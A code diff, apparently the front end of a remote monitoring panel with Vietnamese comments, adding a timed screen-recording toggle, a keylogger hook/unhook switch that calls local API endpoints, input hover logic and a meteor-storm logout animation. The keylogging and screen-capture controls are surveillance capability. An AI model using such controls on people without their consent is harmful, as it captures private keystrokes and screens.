+                showToast("Lỗi: Không thể bắt đầu quay", "error");
+            } else {
+                // Nếu có hẹn giờ -> Set timeout tự tắt
+                if (duration > 0) {
+                    console.log(`Screen auto-stop in ${duration}s`);
+                    screenAutoStopTimer = setTimeout(() => {
+                        toggleScreenRecord(); // Gọi lại chính nó để chạy nhánh Dừng
+                        showToast("Đã dừng quay màn hình (Hết giờ)", "info");
+                    }, duration * 1000);
+                }
+            }
+        })
+        .catch(e => {
+            console.error(e);
+            stopUI();
+        });
+
+    } else {
+        // --- DỪNG GHI ---
+        stopUI();
+        
+        // Hủy hẹn giờ (nếu người dùng bấm dừng trước khi hết giờ)
+        if (screenAutoStopTimer) clearTimeout(screenAutoStopTimer);
+
+        fetch('/api/screen/record/stop')
+            .then(r => r.text())
+            .then(msg => {
+                 console.log("Đã lưu video màn hình.");
+                 showToast("✅ Video màn hình đã được lưu!", "success");
+            });
+    }
+
+    // Hàm phụ trợ reset UI
+    function stopUI() {
+        btn.classList.remove('recording');
+        frame.classList.remove('recording');
+        isScreenRecording = false;
+        if(input) input.value = ""; // Reset ô nhập
+    }
+}
+
+// --- LOGIC KEYLOGGER MỚI (TOGGLE & AUTO) ---
+
+function toggleKeylog() {
+    const btn = document.getElementById('btnKeylogToggle');
+    
+    // Nếu đang tắt -> BẬT (HOOK)
+    if (!isKeylogRunning) {
+        fetch('/api/keylog/hook', {method:'POST'})
+            .then(r => r.json())
+            .then(res => {
+                if(res.ok) {
+                    isKeylogRunning = true;
+                    updateKeylogUI();
+                    // Hiện thông báo Toast
+                    showToast("Đã bật Keylogger (Hook)", "info");
+                } else {
+                    showToast("Lỗi bật Hook!", "error");
+                }
+            })
+            .catch(() => showToast("Lỗi kết nối API.", "error"));
+    } 
+    // Nếu đang bật -> TẮT (UNHOOK)
+    else {
+        fetch('/api/keylog/unhook', {method:'POST'})
+            .then(r => r.json())
+            .then(res => {
+                if(res.ok) {
+                    isKeylogRunning = false;
+                    updateKeylogUI();
+                    // Hiện thông báo Toast
+                    showToast("Đã dừng Keylogger", "info");
+                } else {
+                    showToast("Lỗi tắt Hook!", "error");
+                }
+            })
+            .catch(() => showToast("Lỗi kết nối API.", "error"));
+    }
+}
+
+function updateKeylogUI() {
+    const btn = document.getElementById('btnKeylogToggle');
+    const status = document.getElementById('keylogStatus');
+    
+    if (!btn) return;
+
+    if (isKeylogRunning) {
+        // Trạng thái ĐANG CHẠY
+        btn.innerHTML = "⏸️ Dừng Ghi";
+        btn.classList.add('recording'); // Thêm class đỏ (dùng chung style với nút quay video)
+        // Nếu chưa có class recording trong CSS thì thêm: background: #ef4444 !important;
+        btn.style.backgroundColor = "#ef4444"; 
+        btn.style.borderColor = "#ef4444";
+        btn.style.color = "white";
+        
+        if(status) {
+            status.innerText = "● Đang ghi phím...";
+            status.style.color = "#ef4444"; 
+            status.style.animation = "pulse 1.5s infinite"; // Nhấp nháy nhẹ
+        }
+    } else {
+        // Trạng thái ĐÃ DỪNG
+        btn.innerHTML = "▶️ Bắt đầu Ghi";
+        btn.classList.remove('recording');
+        btn.style.backgroundColor = ""; // Reset về mặc định
+        btn.style.borderColor = "";
+        btn.style.color = "";
+        
+        if(status) {
+            status.innerText = "Đã dừng.";
+            status.style.color = "#cbd5e1";
+            status.style.animation = "none";
+        }
+    }
+}
+
+// --- LOGIC HOVER HIỆN Ô NHẬP ---
+
+
+function startRecHover(type) { // type: 'Webcam' hoặc 'Screen'
+    // Nếu đang ghi rồi thì không hiện input làm gì
+    if ((type === 'Webcam' && isWebcamRecording) || (type === 'Screen' && isScreenRecording)) return;
+
+    // Đợi 3 giây (3000ms) thì hiện ô input
+    recHoverTimer = setTimeout(() => {
+        const wrapper = document.getElementById(`recWrapper${type}`);
+        if(wrapper) wrapper.classList.add('show-input');
+    }, 3000); 
+}
+
+function endRecHover(type) {
+    if (recHoverTimer) clearTimeout(recHoverTimer); // Hủy đếm nếu chuột rời đi sớm
+    
+    // Nếu chưa nhập gì (input rỗng) thì ẩn đi cho gọn
+    const input = document.getElementById(`recTime${type}`);
+    const wrapper = document.getElementById(`recWrapper${type}`);
+    
+    // Nếu đang focus vào ô input thì đừng ẩn vội
+    if (document.activeElement !== input) {
+        if(wrapper) wrapper.classList.remove('show-input');
+    }
+}
+
+// --- HIỆU ỨNG KHẢI HUYỀN (MƯA THIÊN THẠCH CHẬM) ---
+function triggerApocalypse(callback) {
+    // 1. Tạo lớp phủ đỏ (Atmosphere)
+    let overlay = document.querySelector('.apocalypse-overlay');
+    if (!overlay) {
+        overlay = document.createElement('div');
+        overlay.className = 'apocalypse-overlay';
+        document.body.appendChild(overlay);
+    }
+
+    // 2. Tạo container chứa thiên thạch
+    let stormContainer = document.querySelector('.meteor-storm-container');
+    if (!stormContainer) {
+        stormContainer = document.createElement('div');
+        stormContainer.className = 'meteor-storm-container';
+        document.body.appendChild(stormContainer);
+    }
+
+    setTimeout(() => { overlay.classList.add('active'); }, 100);
+
+    // --- HÀM TẠO VỤ NỔ TẠI MẶT ĐẤT ---
+    function spawnExplosion(xPercent) {
+        const boom = document.createElement('div');
+        boom.className = 'impact-explosion';
+        boom.style.left = xPercent + '%'; // Nổ tại vị trí X
+        document.body.appendChild(boom);
+        
+        // Xóa sau khi nổ xong
+        setTimeout(() => boom.remove(), 1000);
+    }
+
+    // --- HÀM SINH THIÊN THẠCH ---
+    function spawnMeteor() {
+        const m = document.createElement('div');
+        m.classList.add('meteor-slow');
+        
+        // Vị trí xuất phát X (từ 20% đến 140% chiều ngang)
+        // Vì bay chéo sang trái nên cần xuất phát tít bên phải mới bay vào giữa màn hình được
+        const startX = Math.random() * 120 + 20; 
+        m.style.left = startX + '%';
+        m.style.top = Math.random() * -20 - 10 + '%';
+
+        // Tốc độ ngẫu nhiên (3s - 5s)
+        const durationSec = Math.random() * 2 + 3; 
+        m.style.animation = `meteorFallSlow ${durationSec}s linear forwards`;
+        
+        // Kích thước ngẫu nhiên
+        const scale = Math.random() * 0.5 + 0.6;
+        m.style.transform = `rotate(-45deg) scale(${scale})`;
+
+        stormContainer.appendChild(m);
+
+        // --- TÍNH TOÁN VỤ NỔ (IMPACT LOGIC) ---
+        // Thiên thạch đi quãng đường dọc (Y) là 150vh (trong CSS)
+        // Mặt đất nằm ở 100vh.
+        // => Thời gian chạm đất = Tổng thời gian * (100 / 150)
+        const impactTimeMs = (durationSec * 1000) * (100 / 150);
+
+        // Vị trí X khi chạm đất:
+        // Thiên thạch di chuyển ngang (X) là -150vw (trong CSS)
+        // => Tại thời điểm chạm đất, nó đã đi được -100vw
+        const endX = startX - 100; 
+
+        // Nếu điểm rơi nằm trong màn hình (0% đến 100%) -> Cho nổ
+        if (endX > 0 && endX < 100) {
+            setTimeout(() => {
+                spawnExplosion(endX);
+            }, impactTimeMs);
+        }
+
+        // Xóa thiên thạch
+        setTimeout(() => m.remove(), durationSec * 1000);
+    }
+
+    // Tạo thiên thạch liên tục
+    const meteorInterval = setInterval(spawnMeteor, 150); // Mật độ dày hơn xíu
+
+    // KẾT THÚC SAU 5 GIÂY -> CHỚP TRẮNG -> LOGOUT
+    setTimeout(() => {
+        clearInterval(meteorInterval);
+        
+        const flash = document.createElement('div');
+        flash.className = 'final-flash';
+        document.body.appendChild(flash);
+        
+        setTimeout(() => flash.style.opacity = '1', 50);
+
+        setTimeout(() => {
+            if (callback) callback();
+            
+            // Dọn dẹp sạch sẽ sau khi logout
+            setTimeout(() => {
+                overlay.remove();
+                stormContainer.remove();
+                flash.remove();
+                // Xóa hết các vụ nổ còn sót lại
+                document.querySelectorAll('.impact-explosion').forEach(e => e.remove());
+            }, 2000);
+        }, 1500);
+
+    }, 5000);
+}
 
 
 // Bắt đầu chu trình sau 5 giây
-setTimeout(scheduleNextWeather, 5000);
+setTimeout(scheduleNextWeather, 2000);
